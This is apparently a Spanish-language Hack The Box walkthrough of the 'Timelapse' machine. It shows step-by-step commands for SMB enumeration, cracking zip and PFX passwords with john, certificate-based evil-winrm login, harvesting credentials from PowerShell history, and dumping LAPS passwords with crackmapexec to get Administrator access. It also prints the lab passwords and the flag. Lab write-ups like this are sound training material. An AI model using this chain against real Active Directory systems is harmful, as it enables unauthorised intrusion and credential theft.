@@ -1,0 +1,255 @@
+I"�v<p>Tenemos el puerto del SMB abierto donde descubriremos el archivo <strong>winrm_backup.zip</strong> que tiene contraseña pero la crackearemos y el descomprimir nos dejara el archivo <strong>legacyy_dev_auth.pfx</strong> que tambien tiene contraseña, asi que la volvemos a crackear y usando <strong>openssl</strong> extraeremos el certificado y una clave privada con la cual nos podemos conectar como el usuario <strong>legacyy</strong> por <strong>EvilWinRM</strong>, despues enumeraremos un poco y encontraremos el historial de powershell que contiene credenciales para el usuario <strong>svc_deploy</strong>, veremos que ese usuario pertece el grupo <strong>LAPS_Readers</strong> asi que dumpearemos <strong>LAPS</strong> usando <strong>crackmapexec</strong> para obtener las credenciales de <strong>Administrator</strong> y leer la flag en el directorio Desktop del usuario <strong>TRX</strong></p>
+
+<h2 class="lead" id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo de nmap con:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="no">T4</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.152</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<p>Y nos reporto que hay varios puertos abiertos:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>      <span class="no">STATE</span> <span class="no">SERVICE</span>
+<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>
+<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>
+<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>
+<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
+<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
+<span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kpasswd5</span>
+<span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span><span class="o">-</span><span class="n">rpc</span><span class="o">-</span><span class="n">epmap</span>
+<span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldapssl</span>
+<span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAP</span>
+<span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAPssl</span>
+<span class="mi">5986</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">wsmans</span>
+<span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">adws</span>
+<span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">49673</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">49674</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">49696</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">52085</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+</code></pre></div></div>
+
+<p>Los de interes podrian ser:</p>
+
+<ul>
+  <li><strong>53</strong>: DNS</li>
+  <li><strong>88</strong>: Protocolo de autenticacion Kerberos</li>
+  <li><strong>139/445</strong>: NetBIOS-SSN/Microsoft-DS - SMB y NetBIOS</li>
+  <li><strong>5986</strong>: WinRM por SSL (lo usaremos mas adelante)</li>
+</ul>
+
+<p>Podriamos hacer un escaneo para sacar mas informacion sobre las versiones y servicios que esten corriendo en esos puertos, pero en este caso omitiremos eso por que no hara falta</p>
+
+<h3 id="enumeracion-smb">Enumeracion SMB</h3>
+
+<p>De primeras podemos usar <strong>crackmapexec</strong> sobre SMB para obtener informacion inicial sobre el servicio SMB de la maquina:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.152</span>
+</code></pre></div></div>
+
+<p>Y esto nos arroja:</p>
+
+<p><img src="/assets/img/timelapse/1.png" alt="" /></p>
+
+<p>Podemos ver que el nombre es <strong>DC01</strong>, el dominio es <strong>timelapse.htb</strong>, la version de windows, y que no se usa <strong>SMBv1</strong>, con esta informacion sabemos que estamos contra un <strong>Domain Controller</strong> en un entorno de <strong>AD</strong></p>
+
+<p>Para hacer las cosas mas faciles podemos editar el <strong>/etc/hosts</strong> para indicarle que el dominio <strong>timelapse.htb</strong> se resuelva a la IP <strong>10.10.11.152</strong></p>
+
+<p>Para seguir enumerando podemos usar <strong>crackmapexec</strong>, <strong>smbmap</strong>, <strong>smbclient</strong> o <strong>impacket-smbclient</strong>, en mi caso usare de nuevo <strong>crackmapexec</strong> para enumerar recursos compartidos por SMB:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">timelapse</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'c4rta'</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">''</span> <span class="o">--</span><span class="n">shares</span>
+</code></pre></div></div>
+
+<p>Esto nos arroja:</p>
+
+<p><img src="/assets/img/timelapse/2.png" alt="" /></p>
+
+<p>Vemos que tenemos permisos de lectura en dos recursos</p>
+
+<ul>
+  <li><strong>IPC$</strong>: Recurso para la comunicacion o intercomunicacion de procesos</li>
+  <li><strong>Shares</strong>: Comunmente usado para compartir archivos</li>
+</ul>
+
+<p>Ahora nos conectaremos al recurso <strong>shares</strong> usando <strong>smbclient</strong> para explorar su contenido</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">smbclient</span> <span class="sr">//</span><span class="n">timelapse</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span><span class="no">Shares</span> <span class="o">-</span><span class="no">N</span>
+</code></pre></div></div>
+
+<p>Despues de ver un poco, en el directorio <strong>\timelapse.htb\Shares\Dev</strong> encontraremos un comprimido llamado <strong>winrm_backup.zip</strong>, asi que usando <strong>get winrm_backup.zip</strong> nos lo descargaremos a nuestra maquina</p>
+
+<p>Adicionalmente en el directorio <strong>HelpDesk</strong> podemos encontrar archivos de <strong>LAPS</strong></p>
+
+<p><img src="/assets/img/timelapse/3.png" alt="" /></p>
+
+<p>LAPS significa <strong>Local Administrator Password Solution</strong> y proporciona administracion de cuentas locales para un dominio</p>
+
+<h3 id="cracking-winrm_backup">Cracking winrm_backup</h3>
+
+<p>Si intentamos descomprimirlo veremos que nos pide contraseña:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Archive</span><span class="p">:</span>  <span class="n">winrm_backup</span><span class="p">.</span><span class="nf">zip</span>
+<span class="p">[</span><span class="n">winrm_backup</span><span class="p">.</span><span class="nf">zip</span><span class="p">]</span> <span class="n">legacyy_dev_auth</span><span class="p">.</span><span class="nf">pfx</span> <span class="ss">password:
+</span></code></pre></div></div>
+
+<p>Evidentemente no sabemos la contraseña, y como es un archivo zip, podemos usar <strong>zip2john</strong> para luego crackearlo con John</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">zip2john</span> <span class="n">winrm_backup</span><span class="p">.</span><span class="nf">zip</span> <span class="o">&gt;</span> <span class="nb">hash</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">john</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=</span><span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="nf">txt</span> <span class="nb">hash</span>
+</code></pre></div></div>
+
+<p>Y ahora tenemos la contraseña: <strong>supremelegacy</strong>, y si extraimos tenemos un archivo pfx</p>
+
+<h3 id="cracking-pfx">Cracking PFX</h3>
+
+<p>Un archivo PFX contiene una copia de seguridad de una clave privada y un certificado, les puedo adelantar que con este certificado y clave privada nos podremos conectar por WinRM por el puerto <strong>5986</strong> que es el que usa SSL, asi que usando <strong>openssl</strong> podemos extraer ese certificado y esa clave privada.</p>
+
+<p>Si intentamos extraer la clave usando openssl:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="k">in</span> <span class="n">legacyy_dev_auth</span><span class="p">.</span><span class="nf">pfx</span> <span class="o">-</span><span class="n">nocerts</span> <span class="o">-</span><span class="n">out</span> <span class="n">key</span><span class="p">.</span><span class="nf">pem</span> <span class="o">-</span><span class="n">nodes</span>
+</code></pre></div></div>
+
+<p>Nos pedira una contraseña, si ingresamos la de <strong>supremelegacy</strong> nos dira que es incorrecta, asi que podemos probar con <strong>pfx2john</strong> para sacar el hash y luego crackearlo (otra forma es usar <strong>crackpkcs12</strong>)</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pfx2john</span> <span class="n">legacyy_dev_auth</span><span class="p">.</span><span class="nf">pfx</span> <span class="o">&gt;</span> <span class="n">hashPfx</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">john</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=</span><span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="nf">txt</span> <span class="n">hashPfx</span>
+</code></pre></div></div>
+
+<p>Y tenemos la contraseña: <strong>thuglegacy</strong>, ahora ya podemos sacar el certificado y la clave:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="k">in</span> <span class="n">legacyy_dev_auth</span><span class="p">.</span><span class="nf">pfx</span> <span class="o">-</span><span class="n">nocerts</span> <span class="o">-</span><span class="n">out</span> <span class="n">key</span><span class="p">.</span><span class="nf">pem</span> <span class="o">-</span><span class="n">nodes</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="k">in</span> <span class="n">legacyy_dev_auth</span><span class="p">.</span><span class="nf">pfx</span> <span class="o">-</span><span class="n">nokeys</span> <span class="o">-</span><span class="n">out</span> <span class="n">cert</span><span class="p">.</span><span class="nf">pem</span>
+</code></pre></div></div>
+
+<p>Ahora ya nos podemos conectar con <strong>EvilWinRM</strong> con SSL</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="no">S</span> <span class="o">-</span><span class="n">i</span> <span class="n">timelapse</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="n">c</span> <span class="n">cert</span><span class="p">.</span><span class="nf">pem</span> <span class="o">-</span><span class="n">k</span> <span class="n">key</span><span class="p">.</span><span class="nf">pem</span> 
+</code></pre></div></div>
+
+<p>Y ya somos <strong>legacyy</strong></p>
+
+<p><img src="/assets/img/timelapse/4.png" alt="" /></p>
+
+<h3 id="legacyy--svc_deploy">legacyy –&gt; svc_deploy</h3>
+
+<p>Si empezamos a enumerar, podemos ver que si listamos los usuarios en el sistema con el comando <strong>net user</strong> podemos ver varios:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">legacyy</span><span class="p">\</span><span class="no">Desktop</span><span class="o">&gt;</span> <span class="n">net</span> <span class="n">user</span>
+
+<span class="no">User</span> <span class="n">accounts</span> <span class="k">for</span> <span class="p">\\</span>
+
+<span class="o">-------------------------------------------------------------------------------</span>
+<span class="no">Administrator</span>            <span class="n">babywyrm</span>                 <span class="no">Guest</span>
+<span class="n">krbtgt</span>                   <span class="n">legacyy</span>                  <span class="n">payl0ad</span>
+<span class="n">sinfulz</span>                  <span class="n">svc_deploy</span>               <span class="n">thecybergeek</span>
+<span class="no">TRX</span>
+</code></pre></div></div>
+
+<p>El que nos va a interesar es <strong>svc_deploy</strong>, si vemos mas informacion con el comando <strong>net user svc_deploy</strong>:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">User</span> <span class="nb">name</span>                    <span class="n">svc_deploy</span>
+<span class="no">Full</span> <span class="no">Name</span>                    <span class="n">svc_deploy</span>
+<span class="no">Comment</span>
+<span class="no">User</span><span class="err">'</span><span class="n">s</span> <span class="n">comment</span>
+<span class="no">Country</span><span class="o">/</span><span class="n">region</span> <span class="n">code</span>          <span class="mo">000</span> <span class="p">(</span><span class="no">System</span> <span class="no">Default</span><span class="p">)</span>
+<span class="no">Account</span> <span class="n">active</span>               <span class="no">Yes</span>
+<span class="no">Account</span> <span class="n">expires</span>              <span class="no">Never</span>
+
+<span class="no">Password</span> <span class="n">last</span> <span class="n">set</span>            <span class="mi">10</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">12</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">37</span> <span class="no">PM</span>
+<span class="no">Password</span> <span class="n">expires</span>             <span class="no">Never</span>
+<span class="no">Password</span> <span class="n">changeable</span>          <span class="mi">10</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">12</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">37</span> <span class="no">PM</span>
+<span class="no">Password</span> <span class="n">required</span>            <span class="no">Yes</span>
+<span class="no">User</span> <span class="n">may</span> <span class="n">change</span> <span class="n">password</span>     <span class="no">Yes</span>
+
+<span class="no">Workstations</span> <span class="n">allowed</span>         <span class="no">All</span>
+<span class="no">Logon</span> <span class="n">script</span>
+<span class="no">User</span> <span class="n">profile</span>
+<span class="no">Home</span> <span class="n">directory</span>
+<span class="no">Last</span> <span class="n">logon</span>                   <span class="mi">10</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">12</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">53</span> <span class="no">PM</span>
+
+<span class="no">Logon</span> <span class="n">hours</span> <span class="n">allowed</span>          <span class="no">All</span>
+
+<span class="no">Local</span> <span class="no">Group</span> <span class="no">Memberships</span>      <span class="o">*</span><span class="no">Remote</span> <span class="no">Management</span> <span class="no">Use</span>
+<span class="no">Global</span> <span class="no">Group</span> <span class="n">memberships</span>     <span class="o">*</span><span class="no">LAPS_Readers</span>         <span class="o">*</span><span class="no">Domain</span> <span class="no">Users</span>
+<span class="no">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</code></pre></div></div>
+
+<p>Vemos que forma en el grupo <strong>LAPS_Readers</strong>, eso quiere decir que posiblemente el usuario <strong>svc_deploy</strong> tiene permisos para leer el contenido de LAPS, asi que una buena idea seria convertirnos en ese usuario, en este punto de pura enumeracion, y una de las cosas que se pueden hacer es ver el historial de powershell de <strong>svc_deploy</strong>, esto lo podemos hacer automaticamente usando <strong>WinPeas</strong>.</p>
+
+<p>El historial de powershell se almacena en <strong>C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</strong>, si lo leemos podemos ver que ha ejecutado varios comandos</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whoami</span><span class="w">
+</span><span class="nx">ipconfig</span><span class="w"> </span><span class="nx">/all</span><span class="w">
+</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w"> </span><span class="o">|</span><span class="n">select-string</span><span class="w"> </span><span class="nx">LIST</span><span class="w">
+</span><span class="nv">$so</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSessionOption</span><span class="w"> </span><span class="nt">-SkipCACheck</span><span class="w"> </span><span class="nt">-SkipCNCheck</span><span class="w"> </span><span class="nt">-SkipRevocationCheck</span><span class="w">
+</span><span class="nv">$p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'E3R$Q62^12p7PLlC%KWaxuaV'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="nv">$c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s1">'svc_deploy'</span><span class="p">,</span><span class="w"> </span><span class="nv">$p</span><span class="p">)</span><span class="w">
+</span><span class="n">invoke-command</span><span class="w"> </span><span class="nt">-computername</span><span class="w"> </span><span class="nx">localhost</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$c</span><span class="w"> </span><span class="nt">-port</span><span class="w"> </span><span class="nx">5986</span><span class="w"> </span><span class="nt">-usessl</span><span class="w"> </span><span class="o">-</span><span class="w">
+</span><span class="n">SessionOption</span><span class="w"> </span><span class="nv">$so</span><span class="w"> </span><span class="nt">-scriptblock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w">
+</span><span class="n">get-aduser</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-properties</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span><span class="kr">exit</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Observa que en la variable <strong>$p</strong> se le esta asignando el valor de <strong>E3R$Q62^12p7PLlC%KWaxuaV</strong>, pero hace uso de <strong>ConvertTo-SecureString</strong> para cifrar ese string, y despues con  <strong>System.Management.Automation.PSCredential</strong> le esta asignando la contraseña almacenada en <strong>$p</strong> al usuario <strong>svc_deploy</strong>, y esa contraseña es <strong>E3R$Q62^12p7PLlC%KWaxuaV</strong>, como el usuario <strong>svc_deploy</strong> pertecene el grupo <strong>Remote Management Use</strong> nos podemos conectar usando <strong>EvilWinRM</strong> con SSL</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="no">S</span> <span class="o">-</span><span class="n">i</span> <span class="n">timelapse</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">svc_deploy</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">'E3R$Q62^12p7PLlC%KWaxuaV'</span>
+</code></pre></div></div>
+
+<h3 id="escalada-de-privilegios">Escalada de privilegios</h3>
+
+<p>Recordemos que <strong>svc_deploy</strong> pertecene al grupo <strong>LAPS_Readers</strong>, asi que es muy probable que podamos ver el contenido de LAPS, aqui hare una pausa, hay varias maneras de dumpear LAPS, podemos usar <strong>Get-LAPSPasswords.ps1</strong>, simplemente nos conectamos con <strong>EvilWinRM</strong> como <strong>svc_deploy</strong> y despues nos pasamos <strong>Get-LAPSPasswords.ps1</strong> y lo ejecutamos, o podemos usar <strong>crackmapexec</strong> con el modulo de <strong>ldap</strong>:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="n">timelapse</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">svc_deploy</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">'E3R$Q62^12p7PLlC%KWaxuaV'</span> <span class="o">-</span><span class="no">M</span> <span class="n">laps</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">SMB</span>         <span class="n">timelapse</span><span class="p">.</span><span class="nf">htb</span>   <span class="mi">445</span>    <span class="no">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Windows</span> <span class="mf">10.0</span> <span class="no">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="ss">:timelapse</span><span class="p">.</span><span class="nf">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="ss">:True</span><span class="p">)</span> <span class="p">(</span><span class="no">SMBv1</span><span class="ss">:False</span><span class="p">)</span>
+<span class="no">LDAP</span>        <span class="n">timelapse</span><span class="p">.</span><span class="nf">htb</span>   <span class="mi">389</span>    <span class="no">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">timelapse</span><span class="p">.</span><span class="nf">htb</span><span class="p">\</span><span class="n">svc_deploy</span><span class="ss">:E3R</span><span class="vg">$Q62</span><span class="o">^</span><span class="mi">12</span><span class="n">p7PLlC</span><span class="o">%</span><span class="no">KWaxuaV</span> 
+<span class="no">LAPS</span>        <span class="n">timelapse</span><span class="p">.</span><span class="nf">htb</span>   <span class="mi">389</span>    <span class="no">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="no">Getting</span> <span class="no">LAPS</span> <span class="no">Passwords</span>
+<span class="no">LAPS</span>        <span class="n">timelapse</span><span class="p">.</span><span class="nf">htb</span>   <span class="mi">389</span>    <span class="no">DC01</span>             <span class="no">Computer</span><span class="p">:</span> <span class="no">DC01</span><span class="err">$</span>                <span class="no">Password</span><span class="p">:</span> <span class="mi">3</span><span class="n">s</span><span class="ss">:apT2HA9i</span><span class="p">(</span><span class="no">M2Q</span><span class="err">@</span><span class="mi">8</span><span class="no">Jh8r0c</span><span class="vi">@w1</span>
+</code></pre></div></div>
+
+<p>(la contraseña es diferente para cada usuario)</p>
+
+<p>La contraseña es: <strong>3s:apT2HA9i(M2Q@8Jh8r0c@w1</strong></p>
+
+<p>Ahora solo nos queda conectarnos por <strong>EvilWinRM</strong> como el usuario <strong>Administrator</strong> y ya</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="no">S</span> <span class="o">-</span><span class="n">i</span> <span class="n">timelapse</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="n">u</span> <span class="no">Administrator</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">'3s:apT2HA9i(M2Q@8Jh8r0c@w1'</span>
+</code></pre></div></div>
+
+<p>Para no poner mas capturas, la flag no esta en directorio Desktop de Administrator, si recuerdas, cuando enumeramos usuarios, existia uno llamado <strong>TRX</strong> que tambien pertenece a Domain Admins, asi que la flag esta en el directorio desktop de ese usuario, y solo hace falta leerla con:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">type</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">TRX</span><span class="p">\</span><span class="no">Desktop</span><span class="p">\</span><span class="n">root</span><span class="p">.</span><span class="nf">tx</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="n">type</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">TRX</span><span class="p">\</span><span class="no">Desktop</span><span class="p">\</span><span class="n">root</span><span class="p">.</span><span class="nf">txt</span>
+<span class="mi">7</span><span class="n">f573da830f9bc884f3afcec7a23cdc7</span>
+</code></pre></div></div>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
